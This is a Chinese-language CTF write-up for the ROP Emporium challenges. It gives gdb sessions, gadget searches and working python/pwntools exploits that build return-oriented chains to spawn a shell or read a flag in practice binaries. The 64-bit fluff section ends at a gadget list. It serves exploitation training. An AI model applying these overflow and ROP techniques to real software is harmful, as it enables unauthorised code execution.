---
layout: post
title:  "ROP Emporium Writeup"
image: ''
date:   2017-11-02 00:06:31
tags:
- ctf
description: ''
categories:
- ctf
---

[ROP Emporium](https://ropemporium.com/)

## ret2win
一个简单的栈溢出覆盖返回地址，先看 32 位程序：
```
gdb-peda$ disassemble pwnme
Dump of assembler code for function pwnme:
   0x080485f6 <+0>:     push   ebp
   0x080485f7 <+1>:     mov    ebp,esp
   0x080485f9 <+3>:     sub    esp,0x28
   0x080485fc <+6>:     sub    esp,0x4
   0x080485ff <+9>:     push   0x20
   0x08048601 <+11>:    push   0x0
   0x08048603 <+13>:    lea    eax,[ebp-0x28]
   0x08048606 <+16>:    push   eax
   0x08048607 <+17>:    call   0x8048460 <memset@plt>
   0x0804860c <+22>:    add    esp,0x10
   0x0804860f <+25>:    sub    esp,0xc
   0x08048612 <+28>:    push   0x804873c
   0x08048617 <+33>:    call   0x8048420 <puts@plt>
   0x0804861c <+38>:    add    esp,0x10
   0x0804861f <+41>:    sub    esp,0xc
   0x08048622 <+44>:    push   0x80487bc
   0x08048627 <+49>:    call   0x8048420 <puts@plt>
   0x0804862c <+54>:    add    esp,0x10
   0x0804862f <+57>:    sub    esp,0xc
   0x08048632 <+60>:    push   0x8048821
   0x08048637 <+65>:    call   0x8048400 <printf@plt>
   0x0804863c <+70>:    add    esp,0x10
   0x0804863f <+73>:    mov    eax,ds:0x804a060
   0x08048644 <+78>:    sub    esp,0x4
   0x08048647 <+81>:    push   eax
   0x08048648 <+82>:    push   0x32
   0x0804864a <+84>:    lea    eax,[ebp-0x28]
   0x0804864d <+87>:    push   eax
   0x0804864e <+88>:    call   0x8048410 <fgets@plt>
   0x08048653 <+93>:    add    esp,0x10
   0x08048656 <+96>:    nop
   0x08048657 <+97>:    leave  
   0x08048658 <+98>:    ret    
End of assembler dump.
gdb-peda$ disassemble ret2win 
Dump of assembler code for function ret2win:
   0x08048659 <+0>:     push   ebp
   0x0804865a <+1>:     mov    ebp,esp
   0x0804865c <+3>:     sub    esp,0x8
   0x0804865f <+6>:     sub    esp,0xc
   0x08048662 <+9>:     push   0x8048824
   0x08048667 <+14>:    call   0x8048400 <printf@plt>
   0x0804866c <+19>:    add    esp,0x10
   0x0804866f <+22>:    sub    esp,0xc
   0x08048672 <+25>:    push   0x8048841
   0x08048677 <+30>:    call   0x8048430 <system@plt>
   0x0804867c <+35>:    add    esp,0x10
   0x0804867f <+38>:    nop
   0x08048680 <+39>:    leave  
   0x08048681 <+40>:    ret    
End of assembler dump.
```
函数 `ret2win()` 的地址为 `0x08048659`，
```
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium_all_challenges/ret2win32/ret2win32 
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd580 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
EBX: 0x0 
ECX: 0xffffd580 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
EDX: 0xf7f90860 --> 0x0 
ESI: 0xf7f8ee28 --> 0x1d1d30 
EDI: 0x0 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd5b0 --> 0xf7f80062 --> 0x41000000 ('')
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffd5b0 --> 0xf7f80062 --> 0x41000000 ('')
0004| 0xffffd5b4 --> 0xffffd5d0 --> 0x1 
0008| 0xffffd5b8 --> 0x0 
0012| 0xffffd5bc --> 0xf7dd57c3 (<__libc_start_main+243>:       add    esp,0x10)
0016| 0xffffd5c0 --> 0xf7f8ee28 --> 0x1d1d30 
0020| 0xffffd5c4 --> 0xf7f8ee28 --> 0x1d1d30 
0024| 0xffffd5c8 --> 0x0 
0028| 0xffffd5cc --> 0xf7dd57c3 (<__libc_start_main+243>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern_offset 0x41414641
1094796865 found at offset: 44
```
得到了偏移为 44，于是构造下面的输入：
```
$ python2 -c "print 'A'*44 + '\x59\x86\x04\x08'" | ./ret2win32 
...
> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```

64 位程序也是一样的，只不过返回地址变成了 8 个字节：
```
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium_all_challenges/ret2win/ret2win 
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe3b0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBX: 0x0 
RCX: 0x1f 
RDX: 0x7ffff7dd4710 --> 0x0 
RSI: 0x7fffffffe3b0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RDI: 0x7fffffffe3b1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe3d8 ("AA0AAFAAb")
RIP: 0x400810 (<pwnme+91>:      ret)
R8 : 0x0 
R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0)
R10: 0x602260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
R11: 0x246 
R12: 0x400650 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe4c0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 <pwnme+84>: call   0x400620 <fgets@plt>
   0x40080e <pwnme+89>: nop
   0x40080f <pwnme+90>: leave  
=> 0x400810 <pwnme+91>: ret    
   0x400811 <ret2win>:  push   rbp
   0x400812 <ret2win+1>:        mov    rbp,rsp
   0x400815 <ret2win+4>:        mov    edi,0x4009e0
   0x40081a <ret2win+9>:        mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3d8 ("AA0AAFAAb")
0008| 0x7fffffffe3e0 --> 0x400062 --> 0x1f8000000000000 
0016| 0x7fffffffe3e8 --> 0x7ffff7a41f6a (<__libc_start_main+234>:       mov    edi,eax)
0024| 0x7fffffffe3f0 --> 0x0 
0032| 0x7fffffffe3f8 --> 0x7fffffffe4c8 --> 0x7fffffffe82a ("/home/firmy/Desktop/rop_emporium_all_challenges/ret2win/ret2win")
0040| 0x7fffffffe400 --> 0x100000000 
0048| 0x7fffffffe408 --> 0x400746 (<main>:      push   rbp)
0056| 0x7fffffffe410 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
gdb-peda$ pattern_offset 0x6141414541412941
7007954260868540737 found at offset: 32
```
函数 `ret2win()` 的地址为 `0x0000000000400810`。寄存器 `rbp` 的内容为 `0x6141414541412941`，查看其偏移为 32，则返回地址在 32+8 的位置，构造输入：
```
$ python2 -c "print 'A'*40 + '\x11\x08\x40\x00\x00\x00\x00\x00'" | ./ret2win 
...
> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```

## split
```
$ rabin2 -z split32 
vaddr=0x080486f0 paddr=0x000006f0 ordinal=000 sz=22 len=21 section=.rodata type=ascii string=split by ROP Emporium
vaddr=0x08048706 paddr=0x00000706 ordinal=001 sz=8 len=7 section=.rodata type=ascii string=32bits\n
vaddr=0x0804870e paddr=0x0000070e ordinal=002 sz=9 len=8 section=.rodata type=ascii string=\nExiting
vaddr=0x08048718 paddr=0x00000718 ordinal=003 sz=44 len=43 section=.rodata type=ascii string=Contriving a reason to ask user for data...
vaddr=0x08048747 paddr=0x00000747 ordinal=004 sz=8 len=7 section=.rodata type=ascii string=/bin/ls
vaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
```
rabin2 是 radare2 里的一个工具，一般拿到一个可执行文件，先查一下它包含字符串，从中发现了 `/bin/cat flag.txt`，地址在 `0x0804a030`。下面开始调试：
```
gdb-peda$ xrefs 
All call references
0x80483c4 <_init+4>:    call   0x80484b0 <__x86.get_pc_thunk.bx>
0x80483d9 <_init+25>:   call   0x8048470
0x804849c <_start+28>:  call   0x8048440 <__libc_start_main@plt>
0x80484e3 <deregister_tm_clones+35>:    call   eax
0x804851d <register_tm_clones+45>:      call   edx
0x804853f <__do_global_dtors_aux+15>:   call   0x80484c0 <deregister_tm_clones>
0x8048570 <frame_dummy+32>:     call   edx
0x8048598 <main+29>:    call   0x8048450 <setvbuf@plt>
0x80485ac <main+49>:    call   0x8048450 <setvbuf@plt>
0x80485bc <main+65>:    call   0x8048420 <puts@plt>
0x80485cc <main+81>:    call   0x8048420 <puts@plt>
0x80485d4 <main+89>:    call   0x80485f6 <pwnme>
0x80485e1 <main+102>:   call   0x8048420 <puts@plt>
0x8048607 <pwnme+17>:   call   0x8048460 <memset@plt>
0x8048617 <pwnme+33>:   call   0x8048420 <puts@plt>
0x8048627 <pwnme+49>:   call   0x8048400 <printf@plt>
0x804863e <pwnme+72>:   call   0x8048410 <fgets@plt>
0x8048657 <usefulFunction+14>:  call   0x8048430 <system@plt>
0x8048674 <__libc_csu_init+4>:  call   0x80484b0 <__x86.get_pc_thunk.bx>
0x804868c <__libc_csu_init+28>: call   0x80483c0 <_init>
0x80486b4 <__libc_csu_init+68>: call   DWORD PTR [ebx+edi*4-0xf8]
0x80486d8 <_fini+4>:    call   0x80484b0 <__x86.get_pc_thunk.bx>
gdb-peda$ disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x08048649 <+0>:     push   ebp
   0x0804864a <+1>:     mov    ebp,esp
   0x0804864c <+3>:     sub    esp,0x8
   0x0804864f <+6>:     sub    esp,0xc
   0x08048652 <+9>:     push   0x8048747
   0x08048657 <+14>:    call   0x8048430 <system@plt>
   0x0804865c <+19>:    add    esp,0x10
   0x0804865f <+22>:    nop
   0x08048660 <+23>:    leave  
   0x08048661 <+24>:    ret    
End of assembler dump.
```
`xrefs` 看到一个函数 `usefulFunction`，该函数调用 `system()`，所以我们控制返回地址跳转到 `0x08048657`，然后将`/bin/cat flag.txt` 的地址传给它，从而打印出 flag。控制返回地址的方法和上一题一样，得到偏移为 44。
下面构造输入：
```
$ python2 -c "print 'A'*44 + '\x57\x86\x04\x08' + '\x30\xa0\x04\x08'" | ./split32 
...
> ROPE{a_placeholder_32byte_flag!}
```
这题还可以利用 plt 的原理来做，`system@plt` 的地址为 `0x8048430`，由于有一个参数，需要一个 `pop ret` 的 gadget：
```
$ objdump -d split32 | grep -A 1 pop
 80483e1:       5b                      pop    %ebx
 80483e2:       c3                      ret
```
gadget 地址 `0x80483e1`，构造下面的输入：
```
$ python2 -c "print 'A'*44 + '\x30\x84\x04\x08' + '\xe1\x83\x04\x08' + '\x30\xa0\x04\x08'" | ./split32 
...
> ROPE{a_placeholder_32byte_flag!}
```
其实由于没有后续的步骤，这里 gadget 的地方填什么都可以，比如 `AAAA`。

下面是 64 位程序：
```
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium_all_challenges/split/split 
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe3c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RBX: 0x0 
RCX: 0x1f 
RDX: 0x7ffff7dd4710 --> 0x0 
RSI: 0x7fffffffe3c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RDI: 0x7fffffffe3c1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe3e8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RIP: 0x400806 (<pwnme+81>:      ret)
R8 : 0x0 
R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0)
R10: 0x602260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
R11: 0x246 
R12: 0x400650 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe4d0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007ff <pwnme+74>: call   0x400620 <fgets@plt>
   0x400804 <pwnme+79>: nop
   0x400805 <pwnme+80>: leave  
=> 0x400806 <pwnme+81>: ret    
   0x400807 <usefulFunction>:   push   rbp
   0x400808 <usefulFunction+1>: mov    rbp,rsp
   0x40080b <usefulFunction+4>: mov    edi,0x4008ff
   0x400810 <usefulFunction+9>: call   0x4005e0 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3e8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0008| 0x7fffffffe3f0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0016| 0x7fffffffe3f8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0024| 0x7fffffffe400 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0032| 0x7fffffffe408 ("IAAeAA4AAJAAfAA5AAKAAgA")
0040| 0x7fffffffe410 ("AJAAfAA5AAKAAgA")
0048| 0x7fffffffe418 --> 0x416741414b4141 ('AAKAAgA')
0056| 0x7fffffffe420 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400806 in pwnme ()
gdb-peda$ find '/bin/cat'
Searching for '/bin/cat' in: None ranges
Found 1 results, display max 1 items:
split : 0x601060 ("/bin/cat flag.txt")
gdb-peda$ pattern_offset 0x6141414541412941
7007954260868540737 found at offset: 32
```
在 64 位下，前六个参数通过 RDI、RSI、RDX、RCX、R8 和 R9 传递，system() 传入一个参数，所以需要使用 `pop rdi; ret` 的 gadget 将字符串的地址传入 rdi 寄存器中。
```
gdb-peda$ ropsearch "pop rdi; ret"
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x00400883 : (b'5fc3')  pop rdi; ret
```
地址在 `0x00400883`，下面构造输入：
```
$ python2 -c "print 'A'*40 + '\x83\x08\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x10\x08\x40\x00\x00\x00\x00\x00'" | ./split 
...
> ROPE{a_placeholder_32byte_flag!}
```

## callme
题目要求依次调用 `callme_one`、`callme_two`和`callme_three`，并且分别传入三个参数 `1`、`2`、`3`，主要考查参数传递和函数调用。

首先得到三个函数的 plt 地址：
```
$ rabin2 -i callme32 | grep callme
ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three
ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one
ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two
```
由于函数有三个参数，我们需要一个类似 `pop pop pop ret` 的 gadget，使用 objdump 来找到它：
```
$ objdump -d callme32 | grep -A 3 pop
...
 80488a8:       5b                      pop    %ebx
 80488a9:       5e                      pop    %esi
 80488aa:       5f                      pop    %edi
 80488ab:       5d                      pop    %ebp
 80488ac:       c3                      ret    
 80488ad:       8d 76 00                lea    0x0(%esi),%esi
...
```
地址在 `0x80488a9`，当然也可以找 `add esp, 8; pop ebp; ret` 这样的：
```
gdb-peda$ ropsearch "add esp, 8"
Searching for ROP gadget: 'add esp, 8' in: binary ranges
0x08048576 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
0x080488c3 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
```
最后构造输入如下：
```
$ python2 -c "print 'A'*44 + '\xc0\x85\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00' + '\x20\x86\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00' + '\xb0\x85\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00'" | ./callme32 
...
> ROPE{a_placeholder_32byte_flag!}
```

下面是 64 位程序：
```
$ rabin2 -i callme | grep callme
ordinal=004 plt=0x00401810 bind=GLOBAL type=FUNC name=callme_three
ordinal=008 plt=0x00401850 bind=GLOBAL type=FUNC name=callme_one
ordinal=011 plt=0x00401870 bind=GLOBAL type=FUNC name=callme_two
```
```
gdb-peda$ ropsearch "pop rdi; pop rsi"
Searching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges
0x00401ab0 : (b'5f5e5ac3')      pop rdi; pop rsi; pop rdx; ret
```
构造输入，有点长，我还是用 pwntools 吧：
```python
from pwn import *

callme_one_plt = 0x00401850
callme_two_plt = 0x00401870
callme_three_plt = 0x00401810
pppr_addr = 0x00401ab0

payload = ""
payload += "A"*40
payload += p64(pppr_addr)
payload += p64(0x1) + p64(0x2) + p64(0x3)
paylaod += p64(callme_one_plt)
payload += p64(pppr_addr)
payload += p64(0x1) + p64(0x2) + p64(0x3)
payload += p64(callme_two_plt)
payload += p64(pppr_addr)
payload += p64(0x1) + p64(0x2) + p64(0x3)
payload += p64(callme_three_plt)

io = process("./callme")
io.sendline(payload)
print io.recvall()
```

## write4
利用 gadget，将 `/bin/sh` 写入到 .data 段中，然后执行，这种方法的好处是不用泄露地址：
```
$ ropgadget --binary write432 --only "mov|pop|ret"
...
0x08048670 : mov dword ptr [edi], ebp ; ret
0x080486da : pop edi ; pop ebp ; ret
```
我们需要 `0x080486da` 和 `0x08048670` 处的 gadget。已知 system() 的 plt 地址为 `0x8048430`， .data 段地址为 `0x804a028`。构造如下：
```python
from pwn import *

pop_edi_ebp = 0x080486da
mov_edi_ebp = 0x08048670
data_addr = 0x804a028
system_plt = 0x8048430

payload = ""
payload += "A"*44
payload += p32(pop_edi_ebp)
payload += p32(data_addr)
payload += "/bin"
payload += p32(mov_edi_ebp)
payload += p32(pop_edi_ebp)
payload += p32(data_addr+4)
payload += "/sh\x00"
payload += p32(mov_edi_ebp)
payload += p32(system_plt)
payload += "BBBB"
payload += p32(data_addr)

io = process('./write432')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
```
```
$ python2 exp.py 
[+] Starting local process './write432': pid 26039
[*] Switching to interactive mode
 $ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```

下面是 64 位程序：
```
$ ropgadget --binary write4 --only "mov|pop|ret"
...
0x0000000000400820 : mov qword ptr [r14], r15 ; ret
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400893 : pop rdi ; ret
```
```python
from pwn import *

pop_r14_r15 = 0x0000000000400890
mov_r14_r15 = 0x0000000000400820
pop_rdi = 0x0000000000400893
data_addr = 0x0000000000601050
system_plt = 0x004005e0

payload = ""
payload += "A"*40
payload += p64(pop_r14_r15)
payload += p64(data_addr)
payload += "/bin/sh\x00"
payload += p64(mov_r14_r15)
payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_plt)

io = process('./write4')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
```

## badchars
和上一题差不多，但这一次对部分敏感字符进行了 xor，所以在传参之前要利用 gadget 进行解密。

在函数 `pwnme()` 中调用了进行字符检查的函数 `checkBadchars()`：
```
gdb-peda$ xrefs
...
0x8048775 <pwnme+191>:  call   0x8048801 <checkBadchars>
...
gdb-peda$ disassemble checkBadchars
Dump of assembler code for function checkBadchars:
   0x08048801 <+0>:     push   ebp
   0x08048802 <+1>:     mov    ebp,esp
   0x08048804 <+3>:     sub    esp,0x10
   0x08048807 <+6>:     mov    BYTE PTR [ebp-0x10],0x62
   0x0804880b <+10>:    mov    BYTE PTR [ebp-0xf],0x69
   0x0804880f <+14>:    mov    BYTE PTR [ebp-0xe],0x63
   0x08048813 <+18>:    mov    BYTE PTR [ebp-0xd],0x2f
   0x08048817 <+22>:    mov    BYTE PTR [ebp-0xc],0x20
   0x0804881b <+26>:    mov    BYTE PTR [ebp-0xb],0x66
   0x0804881f <+30>:    mov    BYTE PTR [ebp-0xa],0x6e
   0x08048823 <+34>:    mov    BYTE PTR [ebp-0x9],0x73
   0x08048827 <+38>:    mov    DWORD PTR [ebp-0x4],0x0
   0x0804882e <+45>:    mov    DWORD PTR [ebp-0x8],0x0
   0x08048835 <+52>:    mov    DWORD PTR [ebp-0x4],0x0
   0x0804883c <+59>:    jmp    0x804887c <checkBadchars+123>
   0x0804883e <+61>:    mov    DWORD PTR [ebp-0x8],0x0
   0x08048845 <+68>:    jmp    0x8048872 <checkBadchars+113>
   0x08048847 <+70>:    mov    edx,DWORD PTR [ebp+0x8]
   0x0804884a <+73>:    mov    eax,DWORD PTR [ebp-0x4]
   0x0804884d <+76>:    add    eax,edx
   0x0804884f <+78>:    movzx  edx,BYTE PTR [eax]
   0x08048852 <+81>:    lea    ecx,[ebp-0x10]
   0x08048855 <+84>:    mov    eax,DWORD PTR [ebp-0x8]
   0x08048858 <+87>:    add    eax,ecx
   0x0804885a <+89>:    movzx  eax,BYTE PTR [eax]
   0x0804885d <+92>:    cmp    dl,al
   0x0804885f <+94>:    jne    0x804886e <checkBadchars+109>
   0x08048861 <+96>:    mov    edx,DWORD PTR [ebp+0x8]
   0x08048864 <+99>:    mov    eax,DWORD PTR [ebp-0x4]
   0x08048867 <+102>:   add    eax,edx
   0x08048869 <+104>:   mov    BYTE PTR [eax],0xeb
   0x0804886c <+107>:   jmp    0x8048878 <checkBadchars+119>
   0x0804886e <+109>:   add    DWORD PTR [ebp-0x8],0x1
   0x08048872 <+113>:   cmp    DWORD PTR [ebp-0x8],0x7
   0x08048876 <+117>:   jbe    0x8048847 <checkBadchars+70>
   0x08048878 <+119>:   add    DWORD PTR [ebp-0x4],0x1
   0x0804887c <+123>:   mov    eax,DWORD PTR [ebp-0x4]
   0x0804887f <+126>:   cmp    eax,DWORD PTR [ebp+0xc]
   0x08048882 <+129>:   jb     0x804883e <checkBadchars+61>
   0x08048884 <+131>:   nop
   0x08048885 <+132>:   leave  
   0x08048886 <+133>:   ret    
End of assembler dump.
```
badchars 就是上面的从地址 `0x08048807` 到 `0x08048823` 的字符，也可以用 rabin2 查看：
```
$ rabin2 -z badchars32
...
vaddr=0x0804894c paddr=0x0000094c ordinal=003 sz=36 len=35 section=.rodata type=ascii string=badchars are: b i c / <space> f n s
```
查找带 xor 的 gadget：
```
$ ropgadget --binary badchars32 --only "mov|pop|ret|xor"
...
0x08048893 : mov dword ptr [edi], esi ; ret
0x08048896 : pop ebx ; pop ecx ; ret
0x08048899 : pop esi ; pop edi ; ret
0x08048890 : xor byte ptr [ebx], cl ; ret
```
```python
from pwn import *

xor_ebx_cl  = 0x08048890
pop_ebx_ecx = 0x08048896
pop_esi_edi = 0x08048899
mov_edi_esi = 0x08048893

system_plt  = 0x080484e0
data_addr   = 0x0804a038

# 加密
badchars    = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte    = 0x1
while(1):
    binsh = ""
    for i in "/bin/sh\x00":
        c = ord(i) ^ xor_byte
        if c in badchars:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 8:
        break

# 写入
payload = ""
payload += "A"*44
payload += p32(pop_esi_edi)
payload += binsh[:4]
payload += p32(data_addr)
payload += p32(mov_edi_esi)
payload += p32(pop_esi_edi)
payload += binsh[4:8]
payload += p32(data_addr + 4)
payload += p32(mov_edi_esi)

# 解密
for i in range(len(binsh)):
    payload += p32(pop_ebx_ecx)
    payload += p32(data_addr + i)
    payload += p32(xor_byte)
    payload += p32(xor_ebx_cl)

# 执行
payload += p32(system_plt)
payload += "BBBB"
payload += p32(data_addr)

io = process('./badchars32')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
```

下面是 64 位程序：
```
$ ropgadget --binary badchars --only "mov|pop|ret|xor"
...
0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
0x0000000000400b3b : pop r12 ; pop r13 ; ret
0x0000000000400b40 : pop r14 ; pop r15 ; ret
0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
0x0000000000400b39 : pop rdi ; ret
```
```python
from pwn import *

pop_r12_r13  = 0x0000000000400b3b
mov_r13_r12  = 0x0000000000400b34
pop_r14_r15  = 0x0000000000400b40
xor_r15_r14b = 0x0000000000400b30
pop_rdi      = 0x0000000000400b39

system_plt = 0x00000000004006f0
data_addr  = 0x0000000000601000

badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte = 0x1
while(1):
    binsh = ""
    for i in "/bin/sh\x00":
        c = ord(i) ^ xor_byte
        if c in badchars:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 8:
        break

payload = ""
payload += "A"*40
payload += p64(pop_r12_r13)
payload += binsh
payload += p64(data_addr)
payload += p64(mov_r13_r12)

for i in range(len(binsh)):
    payload += p64(pop_r14_r15)
    payload += p64(xor_byte)
    payload += p64(data_addr + i)
    payload += p64(xor_r15_r14b)

payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_plt)

io = process('./badchars')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
```

## fluff
看题目的意思是利用类似 `mov [reg], reg` 这样的 gadgets 将 `/bin/sh` 写入，然后执行，但是通过 ropgadget 的搜索，发现没有像以上题目那样直接的 gadgets，稍微增加了一点难度：
```
$ ropgadget --binary fluff32 --only "mov|pop|ret|xor|xchg"
...
0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
0x080483e1 : pop ebx ; ret
0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
```
`ecx` 放地址， `edx` 放数据，然后把数据写到地址处：
```python
from pwn import *

system_plt   = 0x08048430
data_addr = 0x0804a028

pop_ebx      = 0x080483e1
mov_ecx_edx  = 0x08048693
xchg_edx_ecx = 0x08048689
xor_edx_ebx  = 0x0804867b
xor_edx_edx  = 0x08048671

def write_data(data, addr):
    # addr -> ecx
    payload = ""
    payload += p32(xor_edx_edx)
    payload += "BBBB"
    payload += p32(pop_ebx)
    payload += p32(addr)
    payload += p32(xor_edx_ebx)
    payload += "BBBB"
    payload += p32(xchg_edx_ecx)
    payload += "BBBB"
    
    # data -> edx
    payload += p32(xor_edx_edx)
    payload += "BBBB"
    payload += p32(pop_ebx)
    payload += data
    payload += p32(xor_edx_ebx)
    payload += "BBBB"
    
    # edx -> [ecx]
    payload += p32(mov_ecx_edx)
    payload += "BBBB"
    payload += p32(0)

    return payload

payload = ""
payload += "A"*44

payload += write_data("/bin", data_addr)
payload += write_data("/sh\x00", data_addr + 4)

payload += p32(system_plt)
payload += "BBBB"
payload += p32(data_addr)

io = process('./fluff32')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
```

下面是 64 位程序：
```
$ ropgadget --binary fluff --only "mov|pop|ret|xor|xchg" --depth 20
...
0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
